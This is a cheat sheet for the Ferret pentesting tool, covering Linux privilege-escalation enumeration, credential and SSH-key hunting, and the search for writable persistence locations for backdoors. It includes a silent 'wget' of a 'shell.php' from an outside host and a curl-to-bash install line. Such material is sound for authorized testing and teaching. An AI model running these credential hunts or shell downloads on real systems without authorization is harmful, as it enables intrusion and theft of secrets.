# Ferret Pentesting Cheat Sheet ğŸ”¥

Quick reference for security researchers, pentesters, red teamers, and blue teamers.

## Installation

```bash
# Quick install
curl -fsSL https://raw.githubusercontent.com/Karmanya03/Ferret/main/install.sh | bash

# Or via cargo
cargo install ferret-rs
```

## Core Security Commands

### SUID/SGID Enumeration

```bash
# Find SUID binaries (privilege escalation)
fr suid                    # Search current directory
fr suid /                  # Full system scan
fr suid -q                 # Quiet mode (paths only)
fr suid -v                 # Verbose (with permissions)
fr suid -o suid.txt        # Save to file

# Find SGID binaries
fr sgid                    # Search current directory
fr sgid /                  # Full system scan
fr sgid -q                 # Quiet mode
fr sgid -o sgid.txt        # Save results

# Equivalent old commands:
# find / -perm -4000 -type f 2>/dev/null
# find / -perm -2000 -type f 2>/dev/null
```

### World-Writable Files

```bash
# Find writable files and directories
fr writable                # All writable files/dirs
fr writable -d             # Only directories
fr writable -f             # Only files
fr writable /var -q        # Quiet search in /var
fr writable -v             # Verbose with permissions
fr writable -o write.txt   # Save results

# Common targets:
fr writable /etc -d        # Writable config dirs
fr writable /tmp           # Temp directory files
fr writable /var           # Var directory
```

### Linux Capabilities

```bash
# Find files with capabilities
fr caps                    # Search current dir
fr caps /                  # Full system scan
fr caps /usr/bin -v        # Check specific dir with details
fr caps -o caps.txt        # Save findings

# Important capabilities to look for:
# cap_setuid, cap_dac_override, cap_sys_admin
```

### Credential & Config Hunter

```bash
# Find interesting files
fr configs                 # Search current dir
fr configs /               # Full system
fr configs /home -v        # User home dirs
fr configs /var/www        # Web server configs
fr configs /etc            # System configs
fr configs -o found.txt    # Save results

# Finds: passwords, SSH keys, certificates, configs, .env files
```

### Recent File Monitor

```bash
# Find recently modified files
fr recent                  # Last 60 minutes (default)
fr recent -t 10            # Last 10 minutes
fr recent -t 1440          # Last 24 hours
fr recent / -t 30          # System-wide, last 30 min
fr recent -v               # Show time since modification
fr recent -o recent.txt    # Save results

# Use case: Monitor changes after exploit
```

### Dev Null Helper

```bash
# Silence errors and output
fr dn find / -name "*.conf"              # Hide all output
fr dn -e find / -name "password"         # Show errors only
fr dn nmap -sV 192.168.1.0/24           # Silent nmap
fr dn wget http://example.com/shell.php # Silent download

# Equivalent to:
# command 2>/dev/null (fr dn)
# command 1>/dev/null (fr dn -e)
```

## Common Pentesting Workflows

### Quick PrivEsc Enumeration

```bash
# All-in-one enumeration
fr suid -q > suid.txt
fr sgid -q > sgid.txt
fr caps -q > caps.txt
fr writable -d -q > writable_dirs.txt
fr configs /home -q > home_configs.txt

# Check results
cat suid.txt sgid.txt caps.txt | grep -E "nmap|vim|find|less|more|python|perl|ruby|php"
```

### Hunt for Credentials

```bash
# Comprehensive credential search
fr configs / -o all_configs.txt

# Search for juicy keywords
grep -i "password\|passwd\|pwd\|credential\|secret\|api\|token\|key" all_configs.txt

# Target specific locations
fr configs /home
fr configs /var/www
fr configs /opt
fr configs /root 2>/dev/null
```

### Monitor System Changes

```bash
# Capture baseline
fr recent / -t 5 -q > before.txt

# Run your exploit/payload
./exploit.sh

# Check what changed
fr recent / -t 5 -q > after.txt
diff before.txt after.txt
```

### Find Persistence Locations

```bash
# Writable directories for backdoors
fr writable / -d -q | grep -E "etc|var|opt|usr/local|tmp"

# Writable startup scripts
fr writable /etc/init.d
fr writable /etc/systemd
fr writable /etc/cron

# Check home directories
fr writable /home -d
```

### Web Server Enumeration

```bash
# Find web configs
fr configs /var/www -v
fr configs /etc/apache2 -v
fr configs /etc/nginx -v

# Find writable web directories
fr writable /var/www -d
fr writable /usr/share/nginx

# Recent web file changes
fr recent /var/www -t 60
```

## Advanced Usage

### Combine with Other Tools

```bash
# Find SUID + check GTFOBins
fr suid -q | while read bin; do 
  basename "$bin"
done | sort -u > suid_bins.txt

# Find configs + grep for passwords
fr configs / -q | xargs grep -l "password" 2>/dev/null

# Capabilities + detailed check
fr caps -q | while read line; do
  echo "=== $line ==="
  getcap "$line"
done
```

### Automation Scripts

```bash
#!/bin/bash
# Quick privesc check script

echo "[+] SUID Binaries:"
fr suid -q | wc -l

echo "[+] SGID Binaries:"
fr sgid -q | wc -l

echo "[+] Files with Capabilities:"
fr caps -q | wc -l

echo "[+] Writable Directories:"
fr writable / -d -q | wc -l

echo "[+] Interesting Configs:"
fr configs /etc -q | wc -l

echo "[+] Recent Changes (10 min):"
fr recent / -t 10 -q | wc -l
```

### One-Liner Collection

```bash
# Find SUID binaries in PATH
fr suid $(echo $PATH | tr ':' ' ') -q

# Hunt for SSH keys
fr configs /home -q | grep -E "id_rsa|id_dsa|id_ecdsa"

# Find writable scripts
fr writable / -f -q | grep -E "\.sh$|\.py$|\.pl$"

# Check for password files
fr configs / -q | grep -i password

# Find recent root activity
fr recent /root -t 60 -q 2>/dev/null

# Enumerate web directories
fr writable /var/www -d -q && fr configs /var/www -q
```

## Comparison with Traditional Commands

| Traditional | Ferret | Notes |
|------------|--------|-------|
| `find / -perm -4000 -type f 2>/dev/null` | `fr suid /` | Cleaner, faster |
| `find / -perm -2000 -type f 2>/dev/null` | `fr sgid /` | Same functionality |
| `find / -writable -type d 2>/dev/null` | `fr writable / -d` | More readable |
| `find / -mmin -60 2>/dev/null` | `fr recent / -t 60` | Easier syntax |
| `getcap -r / 2>/dev/null` | `fr caps /` | Better output |
| `command 2>/dev/null` | `fr dn command` | Shorter, cleaner |

## File Output Formats

All commands support `-o filename` to save results:

```bash
# Plain text output
fr suid -o suid_binaries.txt

# Combine multiple scans
fr suid -q > scan_results.txt
fr sgid -q >> scan_results.txt
fr caps -q >> scan_results.txt

# Verbose output for analysis
fr writable / -v -o writable_detailed.txt
```

## Pro Tips

1. **Use quiet mode for scripting**: `-q` flag outputs only paths
2. **Save everything**: Always use `-o` to save results for later
3. **Search incrementally**: Start with specific dirs, then go system-wide
4. **Combine with grep**: Pipe to grep for targeted results
5. **Use dn for cleaner output**: `fr dn find / -name "*.conf"` vs `find / -name "*.conf" 2>/dev/null`

## Quick Reference Card

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           FERRET PENTEST QUICK REFERENCE                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ fr suid           â†’ Find SUID binaries                  â”‚
â”‚ fr sgid           â†’ Find SGID binaries                  â”‚
â”‚ fr writable       â†’ Find writable files/dirs            â”‚
â”‚ fr caps           â†’ Find files with capabilities        â”‚
â”‚ fr configs        â†’ Find credentials & configs          â”‚
â”‚ fr recent         â†’ Find recently modified files        â”‚
â”‚ fr dn <cmd>       â†’ Run command with output to /dev/nullâ”‚
â”‚                                                          â”‚
â”‚ Flags:                                                   â”‚
â”‚   -q    â†’ Quiet (paths only)                            â”‚
â”‚   -v    â†’ Verbose (detailed info)                       â”‚
â”‚   -o    â†’ Output to file                                â”‚
â”‚   -d    â†’ Directories only (writable)                   â”‚
â”‚   -f    â†’ Files only (writable)                         â”‚
â”‚   -t    â†’ Time in minutes (recent)                      â”‚
â”‚   -e    â†’ Show errors (dn command)                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## Additional Resources

- GitHub: https://github.com/Karmanya03/Ferret
- Full Documentation: See README.md
- GTFOBins: https://gtfobins.github.io/
- PEASS-ng: Combine with LinPEAS for comprehensive enum

---

**Remember**: Always get proper authorization before running security tests!
